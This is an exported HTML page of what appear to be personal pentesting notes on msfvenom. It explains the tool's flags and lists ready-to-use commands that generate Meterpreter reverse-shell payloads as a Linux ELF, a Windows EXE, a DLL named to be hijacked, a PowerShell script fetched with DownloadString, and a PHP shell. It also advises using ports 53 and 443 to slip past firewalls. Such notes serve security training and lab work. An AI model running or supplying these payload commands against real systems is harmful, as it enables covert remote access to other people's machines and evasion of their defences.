<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>msfvenom</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>msfvenom</h1><br /><br />If we have the possibilities to upload a shell on the target and we are
    not limited by a command line,<br />we can use <strong>msfvenom</strong> that is part of the Metasploit Framework,
    which purpose is generate payloads<br /> <br />lport= &lt;port&gt; → <br /> local port(<strong>lport</strong>) where
    the client needs to connect has to be a common port like:<br /> ◇ 53 → DNS<br /> ◇ 443 → HTTPS <br /> These are
    commonly used ports and are less suspicious to get around firewall restrictions :) <br /> <br />-p, --payload →
    Payload to use, must be the same of the on used on the attacker machine<br />-f, --format → Output format<br /> <a
      href=""><img src="images/449-1.png" alt="images/449-1.png" /></a><br /> exe → will create a Windows executable.
    <br /> elf → will create a Linux executable<br /> psh → will create a powershell script you can execute right
    away<br />-o, --out → Save the payload in a output file<br /> <br /><strong><span
        style="color:#a5452a;">example</span></strong> <br />
    <div class="codebox">
      <div class="codebox">
        msfvenom&nbsp;-p&nbsp;linux/x64/meterpreter_reverse_tcp&nbsp;lhost=&lt;local-host&gt;&nbsp;lport=53&nbsp;-f&nbsp;elf&nbsp;-o&nbsp;meter
      </div>
    </div><br /><br /><strong><span style="color:#a5452a;">example Windows:</span></strong><br />
    <div class="codebox">
      <div class="codebox">
        msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.122&nbsp;LPORT=2345&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;/home/kali/Desktop/exploit.exe
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        msfvenom&nbsp;-p&nbsp;windows/x64/meterpreter/reverse_https&nbsp;LHOST=192.168.1.122&nbsp;LPORT=4444&nbsp;-f&nbsp;dll&nbsp;-o&nbsp;/home/kali/Desktop/WTSAPI32.dll
      </div>
    </div><br /><br />ps1(powershell) file that we can download from the target with DownloadString<br />
    <div class="codebox">
      <div class="codebox">
        msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.122&nbsp;LPORT=2345&nbsp;-f&nbsp;psh-reflection&nbsp;-o&nbsp;/home/kali/Desktop/exploit.ps1
      </div>
    </div><br /><br /><strong><span style="color:#a5452a;">example shell php</span></strong><br />
    <div class="codebox">
      <div class="codebox">
        msfvenom&nbsp;-p&nbsp;php/meterpreter_reverse_tcp&nbsp;lhost=&lt;local-host&gt;&nbsp;lport=443&nbsp;-o&nbsp;output.php
      </div>
    </div><br /><br />
  </div>
</body>

</html>